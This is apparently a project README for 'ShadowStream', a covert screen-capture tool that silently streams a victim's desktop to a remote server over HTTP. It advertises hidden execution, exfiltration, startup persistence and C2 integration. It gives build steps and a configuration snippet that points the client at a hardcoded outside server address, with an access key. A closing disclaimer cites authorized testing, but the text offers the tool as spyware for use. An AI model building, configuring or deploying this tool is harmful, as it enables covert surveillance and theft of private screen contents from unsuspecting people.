# 🕶️ ShadowStream

**ShadowStream** is a stealthy screen streaming tool that captures the victim's desktop silently and transmits it over HTTP as a series of image frames. Designed for red team operations and post-exploitation scenarios, ShadowStream is built for stealth, speed, and simplicity.

---
![image](https://github.com/user-attachments/assets/80b0c8e4-1094-47bf-9ce3-dce033808066)

## ⚙️ Features

- 🔒 **Hidden Execution**: Runs silently in the background without any visible windows or user prompts
- 🌐 **HTTP Frame Streaming**: Streams desktop screenshots over plain HTTP using discreet request-based exfiltration
- 📸 **Real-Time Visual Feed**: Continuously captures screen snapshots with minimal delay between frames
- 🎯 **Lightweight Architecture**: Minimal overhead, ideal for integration with C2 panels or use in restricted environments
- 🧰 **Modular Design**: Easy to modify or extend for additional capabilities such as compression or encryption
- 🔄 **Persistence**: Startup apps persistence to ensure ShadowStream runs automatically on system startup

---

## 🚀 Usage

### Running the Server

Start the server by running:

```bash
python3 server.py
```

### Building the Client

1. **Open the Project**
   - Open the `.sln` file in Visual Studio

2. **Configure Settings**
   - Change configuration accordingly in the main function of `main.cpp`:
   
   ```cpp
   // Configuration
   string serverUrl = "https://199.200.120.20:8000";  // Change to your server
   string accessKey = "shadowstream_2024_secure";     // Server access key
   int quality = 100;                                 // JPEG quality (1-100)  
   int fps = 60;                                      // Frames per second
   ```

3. **Install vcpkg Dependencies**
   
   ```bash
   git clone https://github.com/microsoft/vcpkg.git
   cd vcpkg
   .\bootstrap-vcpkg.bat
   .\vcpkg install nlohmann-json:x64-windows-static
   .\vcpkg install cpr:x64-windows-static
   .\vcpkg integrate install
   ```

4. **Configure Visual Studio Project**
   - Restart Visual Studio
   - Open ShadowStream project properties using the wrench icon
   - Navigate to **Configuration Properties > vcpkg > Use Static Lib** = `Yes`
   - Set **Configuration Properties > General > C++ Language Standard** = `ISO C++20`
   - Set **Configuration Properties > C/C++ > Code Generation > Runtime Library** = `Multi-threaded (/MT)`

5. **Build the Project**
   - Build the project in **Release** mode

---

## ⚠️ Disclaimer

This tool is intended for educational purposes, authorized penetration testing. Users are responsible for ensuring they have proper authorization before using this tool on any systems they do not own or have explicit permission to test.

---
